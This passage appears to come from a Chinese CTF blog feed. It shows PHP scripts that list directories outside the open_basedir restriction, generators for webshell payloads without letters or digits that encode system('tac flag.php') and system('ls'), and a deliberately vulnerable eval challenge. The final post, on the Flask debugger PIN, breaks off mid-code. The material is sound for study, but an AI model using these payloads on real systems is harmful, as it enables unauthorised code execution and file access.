同样，对于这个函数，我们在Windows下仍然能够使用通配符&lt;&gt;来列目录，有P神的脚本如下:</p><pre class="line-numbers language-none"><code class="language-none">&lt;?phpini_set(&#39;open_basedir&#39;, dirname(__FILE__));printf(&quot;&lt;b&gt;open_basedir: %s&lt;&#x2F;b&gt;&lt;br &#x2F;&gt;&quot;, ini_get(&#39;open_basedir&#39;));set_error_handler(&#39;isexists&#39;);$dir &#x3D; &#39;d:&#x2F;test&#x2F;&#39;;$file &#x3D; &#39;&#39;;$chars &#x3D; &#39;abcdefghijklmnopqrstuvwxyz0123456789_&#39;;for ($i&#x3D;0; $i &lt; strlen($chars); $i++) &#123;     $file &#x3D; $dir . $chars[$i] . &#39;&lt;&gt;&lt;&#39;;    realpath($file);&#125;function isexists($errno, $errstr)&#123;    $regexp &#x3D; &#39;&#x2F;File\((.*)\) is not within&#x2F;&#39;;    preg_match($regexp, $errstr, $matches);    if (isset($matches[1])) &#123;        printf(&quot;%s &lt;br&#x2F;&gt;&quot;, $matches[1]);    &#125;&#125;?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>realpath()和SplFileInfo::getRealPath()的区别在于,realpath()只有在启用了open_basedir()限制的情况下才能使用这种思路爆目录，而SplFileInfo::getRealPath()可以无视是否开启open_basedir进行列目录(当然，没有开启open_basedir也没必要花这么大的功夫来列目录了)</p><h2 id="利用imageftbbox-绕过"><a href="#利用imageftbbox-绕过" class="headerlink" title="利用imageftbbox()绕过"></a>利用imageftbbox()绕过</h2><p>GD库一般是PHP必备的扩展库之一，当中的imageftbbox()函数也可以起到像realpath()一样的列目录效果。<br>其思想也和open_basedir类似。这个函数第三个参数是字体的路径。我发现当这个参数在open_basedir外的时候，当文件存在，则php会抛出“File(xxxxx) is not within the allowed path(s)”错误。但当文件不存在的时候会抛出“Invalid font filename”错误。 有POC如下:</p><pre class="line-numbers language-none"><code class="language-none">?phpini_set(&#39;open_basedir&#39;, dirname(__FILE__));printf(&quot;&lt;b&gt;open_basedir: %s&lt;&#x2F;b&gt;&lt;br &#x2F;&gt;&quot;, ini_get(&#39;open_basedir&#39;));set_error_handler(&#39;isexists&#39;);$dir &#x3D; &#39;d:&#x2F;test&#x2F;&#39;;$file &#x3D; &#39;&#39;;$chars &#x3D; &#39;abcdefghijklmnopqrstuvwxyz0123456789_&#39;;for ($i&#x3D;0; $i &lt; strlen($chars); $i++) &#123;     $file &#x3D; $dir . $chars[$i] . &#39;&lt;&gt;&lt;&#39;;    &#x2F;&#x2F;$m &#x3D; imagecreatefrompng(&quot;zip.png&quot;);    &#x2F;&#x2F;imagefttext($m, 100, 0, 10, 20, 0xffffff, $file, &#39;aaa&#39;);    imageftbbox(100, 100, $file, &#39;aaa&#39;);&#125;function isexists($errno, $errstr)&#123;    global $file;    if (stripos($errstr, &#39;Invalid font filename&#39;) &#x3D;&#x3D;&#x3D; FALSE) &#123;        printf(&quot;%s&lt;br&#x2F;&gt;&quot;, $file);    &#125;&#125;?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>但是貌似用这种方法进行列目录的话，只能一位一位猜解，具体可以参考P神的文章<a href="https://www.leavesongs.com/PHP/php-bypass-open-basedir-list-directory.html#0x03-realpath">PHP绕过open_basedir列目录的研究</a><br>总之感觉是挺鸡肋的方法，而且和上面的两种方法类似，由于都使用了Windows的通配符，所以这些POC都只能在Windows下使用，Linux下只能暴力猜解。</p><h2 id="利用bindtextdomain-绕过"><a href="#利用bindtextdomain-绕过" class="headerlink" title="利用bindtextdomain()绕过"></a>利用bindtextdomain()绕过</h2><h3 id="bindtextdomain-函数"><a href="#bindtextdomain-函数" class="headerlink" title="bindtextdomain()函数"></a>bindtextdomain()函数</h3><p>bindtextdomain是php下绑定domain到某个目录的函数。用法如下:</p><pre class="line-numbers language-none"><code class="language-none">bindtextdomain ( string $domain , string $directory ) : string<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>第一个参数随便传都行，主要出在第二个参数上，当第二个参数即目录存在时，会返回目录的路径，当目录不存在时，会返回False。故有脚本如下:</p><pre class="line-numbers language-none"><code class="language-none">&lt;?php$re &#x3D; bindtextdomain(&#39;xxx&#39;, $_GET[&#39;dir&#39;]);var_dump($re);?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>这个方法只能用暴力猜解的方法来判断文件是否存在，而且只能在Linux环境下使用，可以说相当鸡肋了。</p>]]></content>
      
      
      
        <tags>
            
            <tag> ctfshow </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>无字母数字的webshell</title>
      <link href="/2022/09/13/wu-zi-mu-shu-zi-de-webshell/"/>
      <url>/2022/09/13/wu-zi-mu-shu-zi-de-webshell/</url>
      
        <content type="html"><![CDATA[<h2 id="无数字和字母的webshell"><a href="#无数字和字母的webshell" class="headerlink" title="无数字和字母的webshell"></a>无数字和字母的webshell</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">echo</span> <span class="token function">ord</span><span class="token punctuation">(</span>a<span class="token operator">^</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">#3 a的ascii和b的ascii按位异或</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>构造第一个字母a</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">echo</span> <span class="token string single-quoted-string">'@'</span><span class="token operator">^</span><span class="token string single-quoted-string">'!'</span><span class="token punctuation">;</span><span class="token comment"># 输出a</span><span class="token variable">$_</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'@'</span><span class="token operator">^</span><span class="token string single-quoted-string">'!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">=</span><span class="token variable">$_</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token comment">#b</span><span class="token variable">$___</span><span class="token operator">=</span><span class="token operator">++</span><span class="token variable">$__</span><span class="token punctuation">;</span><span class="token comment">#c</span><span class="token comment">#就可以生成任意字符了</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>通过<code>(&#39;函数名称&#39;)()</code>来动态调用</p><p>payload生成脚本</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$precode</span><span class="token operator">=</span><span class="token string heredoc-string"><span class="token delimiter symbol"><span class="token punctuation">&lt;&lt;&lt;</span>code</spanspan class="token delimiter symbol">code<span class="token punctuation">;</span></span></span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$precode</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">#使用异或生成任意无字母数字代码</span><span class="token keyword">function</span> <span class="token function-definition function">createCode</span><span class="token punctuation">(</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">global</span> <span class="token variable">$precode</span><span class="token punctuation">;</span><span class="token variable">$ret</span> <span class="token operator">=</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token variable">$c</span> <span class="token operator">=</span> <span class="token variable">$code</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token number">97</span> <span class="token operator">||</span> <span class="token class-name">ord</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">122</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$ret</span> <span class="token operator">.=</span> <span class="token string double-quoted-string">"<span class="token interpolation"><span class="token variable">$c</span></span>"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token variable">$ret</span> <span class="token operator">.=</span> <span class="token string single-quoted-string">'$'</span><span class="token operator">.</span><span class="token function">str_repeat</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'_'</span><span class="token punctuation">,</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">96</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">return</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"<span class="token interpolation"><span class="token variable">$precode</span></span>(\""</span><span class="token operator">.</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token function">stripos</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"("</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"\")"</span><span class="token operator">.</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">,</span> <span class="token function">stripos</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"("</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">echo</span> <span class="token function">createCode</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'system("tac flag.php");'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[a-z]|[0-9]/i'</span><span class="token punctuation">,</span><span class="token variable">$cmd</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>参考文献：</p><p> <a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html</a> </p><p> <a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html</a> </p><h2 id="利用位运算构造"><a href="#利用位运算构造" class="headerlink" title="利用位运算构造"></a>利用位运算构造</h2><h3 id="生成脚本-包含了用异或，或，非的位运算"><a href="#生成脚本-包含了用异或，或，非的位运算" class="headerlink" title="生成脚本(包含了用异或，或，非的位运算)"></a>生成脚本(包含了用异或，或，非的位运算)</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> re<span class="token keyword">import</span> string<span class="token keyword">def</span> <span class="token function">change_by_not</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    const <span class="token operator">=</span> <span class="token number">255</span>    l<span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">)</span>    res <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> char <span class="token keyword">in</span> <span class="token builtin">str</span><span class="token punctuation">:</span>        res<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token number">255</span><span class="token operator">-</span><span class="token builtin">ord</span><span class="token punctuation">(</span>char<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'0x'</span><span class="token punctuation">,</span><span class="token string">'%'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span>    ind<span class="token operator">=</span><span class="token string-interpolation"><span class="token string">f"~"</span></span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> res<span class="token punctuation">:</span>        ind<span class="token operator">+=</span>i    <span class="token keyword">print</span><span class="token punctuation">(</span>ind<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">change_by_xor</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    const <span class="token operator">=</span> <span class="token number">255</span>    l<span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">)</span>    res<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> char <span class="token keyword">in</span> <span class="token builtin">str</span><span class="token punctuation">:</span>        num<span class="token operator">=</span><span class="token builtin">ord</span><span class="token punctuation">(</span>char<span class="token punctuation">)</span>        r<span class="token operator">=</span>num<span class="token operator">^</span>const        res<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token punctuation">)</span>    ind<span class="token operator">=</span><span class="token string">"%ff"</span><span class="token operator">*</span>l<span class="token operator">+</span><span class="token string">'^'</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> res<span class="token punctuation">:</span>        ind<span class="token operator">+=</span>i<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'0x'</span><span class="token punctuation">,</span><span class="token string">'%'</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>ind<span class="token punctuation">)</span><span class="token comment"># ("%10%08%10%09%0e%06%0f"|"%60%60%60%60%60%60%60")();</span><span class="token keyword">def</span> <span class="token function">change_by_or</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    res_list<span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>    <span class="token keyword">for</span> i1 <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> i2 <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            char1<span class="token operator">=</span><span class="token builtin">chr</span><span class="token punctuation">(</span>i1<span class="token punctuation">)</span>            char2<span class="token operator">=</span><span class="token builtin">chr</span><span class="token punctuation">(</span>i2<span class="token punctuation">)</span>            <span class="token keyword">if</span> re<span class="token punctuation">.</span><span class="token keyword">match</span><span class="token punctuation">(</span><span class="token string">'[a-z]|[0-9]|@|!|\+|-|\.|_|\$|&#125;|%|&amp;|;|&lt;|>|\*|/|\^|#|"'</span><span class="token punctuation">,</span>char1<span class="token punctuation">,</span>re<span class="token punctuation">.</span>I<span class="token punctuation">)</span> <span class="token keyword">or</span> re<span class="token punctuation">.</span><span class="token keyword">match</span><span class="token punctuation">(</span><span class="token string">'[a-z]|[0-9]|@|!|\+|-|\.|_|\$|&#125;|%|&amp;|;|&lt;|>|\*|/|\^|#|"'</span><span class="token punctuation">,</span>char2<span class="token punctuation">,</span>re<span class="token punctuation">.</span>I<span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">continue</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                cn1 <span class="token operator">=</span> <span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>char1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'0x'</span><span class="token punctuation">,</span> <span class="token string">'%'</span><span class="token punctuation">)</span>                cn2 <span class="token operator">=</span> <span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>char2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'0x'</span><span class="token punctuation">,</span> <span class="token string">'%'</span><span class="token punctuation">)</span>                res <span class="token operator">=</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>char2<span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>char1<span class="token punctuation">)</span>                res_list<span class="token punctuation">[</span>res<span class="token punctuation">]</span><span class="token operator">=</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>cn2<span class="token punctuation">&#125;</span></span><span class="token string">|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>cn1<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span>                <span class="token comment"># print(f"&#123;cn2&#125;|&#123;cn1&#125;=&#123;chr(res)&#125;")</span>    <span class="token comment"># print(res_list)</span>    orlist<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> s <span class="token keyword">in</span> <span class="token builtin">str</span><span class="token punctuation">:</span>        s_num <span class="token operator">=</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span>        orlist<span class="token punctuation">.</span>append<span class="token punctuation">(</span>res_list<span class="token punctuation">.</span>get<span class="token punctuation">(</span>s_num<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token comment"># print(f"&#123;s&#125;=&#123;res_list.get(s_num)&#125;")</span>    <span class="token comment"># print(orlist)</span>    or1<span class="token operator">=</span><span class="token string">""</span>    or2<span class="token operator">=</span><span class="token string">""</span>    <span class="token keyword">for</span> orres <span class="token keyword">in</span> orlist<span class="token punctuation">:</span>        pos<span class="token operator">=</span>orres<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">'|'</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>orres<span class="token punctuation">[</span><span class="token punctuation">:</span>pos<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token number">3</span><span class="token punctuation">:</span>            or1 <span class="token operator">+=</span> orres<span class="token punctuation">[</span><span class="token punctuation">:</span>pos<span class="token punctuation">]</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            or1<span class="token operator">+=</span>orres<span class="token punctuation">[</span><span class="token punctuation">:</span>pos<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token string">'0'</span><span class="token operator">+</span>orres<span class="token punctuation">[</span><span class="token punctuation">:</span>pos<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>        <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>orres<span class="token punctuation">[</span>pos<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token number">3</span><span class="token punctuation">:</span>            or2 <span class="token operator">+=</span> orres<span class="token punctuation">[</span>pos<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            or2<span class="token operator">+=</span>orres<span class="token punctuation">[</span>pos<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token string">'0'</span><span class="token operator">+</span>orres<span class="token punctuation">[</span>pos<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>or1<span class="token punctuation">&#125;</span></span><span class="token string">"|"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>or2<span class="token punctuation">&#125;</span></span><span class="token string">"'</span></span><span class="token punctuation">)</span>        <span class="token comment"># print(pos)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    <span class="token comment"># change_by_not('ls')</span>    change_by_or<span class="token punctuation">(</span><span class="token string">'ls'</span><span class="token punctuation">)</span>    <span class="token comment"># change_by_xor("phpinfo")</span>    <span class="token comment"># print(ord('t'))</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="使用方式"><a href="#使用方式" class="headerlink" title="使用方式"></a>使用方式</h3><p>change_by_not：</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">phpinfo(); => (~%8f%97%8f%96%91%99%90)();system('ls'); => (~%8c%86%8c%8b%9a%92)(~%93%8c);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>change_by_or：</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">phpinfo(); => ("%10%28%10%29%0e%06%0f"|"%60%60%60%60%60%60%60")();system('ls'); => ("%13%19%13%14%05%0d"|"%60%60%60%60%60%60")("%2c%13"|"%60%60");<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>change_by_xor：</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">phpinfo(); => (%ff%ff%ff%ff%ff%ff%ff^%8f%97%8f%96%91%99%90)();system('ls'); => (%ff%ff%ff%ff%ff%ff^%8c%86%8c%8b%9a%92)(%ff%ff^%93%8c);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> ctfshow </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>flask算PIN值</title>
      <link href="/2022/09/13/flask-suan-pin-zhi/"/>
      <url>/2022/09/13/flask-suan-pin-zhi/</url>
      
        <content type="html"><![CDATA[<h2 id="flask算PIN值"><a href="#flask算PIN值" class="headerlink" title="flask算PIN值"></a>flask算PIN值</h2><p><strong>python3.6和python3.8算法不一样</strong></p><p>还是要学会看源码的生成算法</p><h2 id="探寻PIN码生成算法"><a href="#探寻PIN码生成算法" class="headerlink" title="探寻PIN码生成算法"></a>探寻PIN码生成算法</h2><p> 先写一个简单的Flask测试程序 </p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flaskapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">hello</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token string">'合天网安实验室-实践型网络安全在线学习平台；真实环境，在线实操学网络安全。'</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">"0.0.0.0"</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">8080</span><span class="token punctuation">,</span> debug<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>运行，控制台状态如下</p><p><img src="/images/2dbf5235a729095e8b094a14c38f9760.png" alt="img"></p><p>浏览器如下则成功</p><p><img src="/images/03346ded07b0283c4a0052a88dbd8e5f.png" alt="img"></p><p>接下来开始调试程序，顺藤摸瓜找到生成PIN码的函数</p><p> PIN码是werkzeug的策略，先找到flask中导入werkzeug的部分 </p><p>调试<br>在run.app行下断点，点击调试<img src="/images/e4dd2f36eb62e5fa59e586714ca8fa3f.png" alt="img"> </p><p>点击步入<img src="/images/c0c8ca73c10f9b79f386b5d9909735f8.png" alt="img"> </p><p>转到了flask&#x2F;app.py，直接Ctrl+F搜索werkzeug</p><p> <img src="/images/8584cacb40e8020607a9f09928d0f7b2-1663416119562.png" alt="img"> </p><p>发现程序从werkzeug导入了run_simple模块，而且try部分有run app的参数</p><p>我们直接按住ctrl点击run_simple进去看看</p><p>此时进入了seving.py，找到了负责Debug的部分，PIN码是在debug状态下才有的，那这个部分很有可能存有PIN码生成部分，进去看看<img src="/images/698e5376941a2cf955b3eaf00936fcd0.png" alt="img"> </p><p>此时进入了<code>__init__.py</code>，经过一番审计，先来看一看pin函数</p><p> <img src="/images/52a4eed3bda5e8ac77f2525ec4dbdef5.png" alt="img"> </p><p>主要是get_pin_and_cookie_name函数，进去看看</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">get_pin_and_cookie_name</span><span class="token punctuation">(</span>    app<span class="token punctuation">:</span> <span class="token string">"WSGIApplication"</span><span class="token punctuation">,</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> t<span class="token punctuation">.</span>Union<span class="token punctuation">[</span>t<span class="token punctuation">.</span>Tuple<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">]</span><span class="token punctuation">,</span> t<span class="token punctuation">.</span>Tuple<span class="token punctuation">[</span><span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""Given an application object this returns a semi-stable 9 digit pin    code and a random key.  The hope is that this is stable between    restarts to not make debugging particularly frustrating.  If the pin    was forcefully disabled this returns `None`.    Second item in the resulting tuple is the cookie name for remembering.    """</span>    pin <span class="token operator">=</span> os<span class="token punctuation">.</span>environ<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"WERKZEUG_DEBUG_PIN"</span><span class="token punctuation">)</span>    rv <span class="token operator">=</span> <span class="token boolean">None</span>    num <span class="token operator">=</span> <span class="token boolean">None</span>    <span class="token comment"># Pin was explicitly disabled</span>    <span class="token keyword">if</span> pin <span class="token operator">==</span> <span class="token string">"off"</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token boolean">None</span>    <span class="token comment"># Pin was provided explicitly</span>    <span class="token keyword">if</span> pin <span class="token keyword">is</span> <span class="token keyword">not</span> <span class="token boolean">None</span> <span class="token keyword">and</span> pin<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"-"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>isdigit<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token comment"># If there are separators in the pin, return it directly</span>        <span class="token keyword">if</span> <span class="token string">"-"</span> <span class="token keyword">in</span> pin<span class="token punctuation">:</span>            rv <span class="token operator">=</span> pin        <span class="token keyword">else</span><span class="token punctuation">:</span>            num <span class="token operator">=</span> pin    modname <span class="token operator">=</span> <span class="token builtin">getattr</span><span class="token punctuation">(</span>app<span class="token punctuation">,</span> <span class="token 